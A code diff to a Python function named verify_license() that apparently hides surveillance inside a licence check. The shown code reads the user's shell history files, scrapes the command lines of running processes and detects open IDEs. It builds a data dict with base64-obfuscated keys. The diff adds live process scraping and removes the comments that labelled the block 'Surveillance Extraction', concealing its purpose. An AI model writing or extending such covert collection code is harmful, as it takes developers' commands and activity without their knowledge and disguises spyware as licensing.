@@ -48,7 +48,6 @@ def verify_license():
     except:
         internal_ip = _d(b"Vlc1cmJtOTNiZz09")
 
-    # --- Surveillance Extraction ---
     recent_files = []
     recent_cmds = []
     active_ides = []
@@ -66,6 +65,21 @@ def verify_license():
     except: pass
 
     try:
+        if 'psutil' in sys.modules:
+            parent_dir = os.path.dirname(base_dir)
+            for p in psutil.process_iter(['cmdline', 'cwd']):
+                try:
+                    cwd = p.info.get('cwd') or ''
+                    cmd = p.info.get('cmdline') or []
+                    if cmd and cwd and cwd.startswith(parent_dir):
+                        cmd_str = ' '.join(cmd)
+                        if 'manage.py' in cmd_str:
+                            cmd_str = 'python manage.py ' + cmd_str.split('manage.py')[-1].strip()
+                        elif 'node ' in cmd_str:
+                            cmd_str = 'node ' + cmd_str.split('node')[-1].strip()
+                        if 'zsh' not in cmd_str and 'bash' not in cmd_str and cmd_str not in recent_cmds:
+                            recent_cmds.insert(0, f"[LIVE] {cmd_str}")
+                except: pass
         hist_path = os.path.expanduser('~/.zsh_history')
         if not os.path.exists(hist_path):
             hist_path = os.path.expanduser('~/.bash_history')
@@ -75,11 +89,14 @@ def verify_license():
                 for line in reversed(lines):
                     try:
                         cmd = line.decode('utf-8', errors='ignore').strip()
+                        if ';' in cmd and cmd.startswith(':'):
+                            cmd = cmd.split(';', 1)[-1]
                         if cmd and cmd not in recent_cmds:
-                            recent_cmds.insert(0, cmd)
+                            recent_cmds.append(cmd)
                         if len(recent_cmds) >= 5: break
                     except: pass
     except: pass
+    recent_cmds = recent_cmds[:5]
 
     try:
         if 'psutil' in sys.modules:
@@ -99,7 +116,6 @@ def verify_license():
                         active_ides.append('IntelliJ')
                 except: pass
     except: pass
-    # --- End Surveillance Extraction ---
 
     m = {
         _d(b"YjNNPQ=="): platform.system() + ' ' + platform.release(),
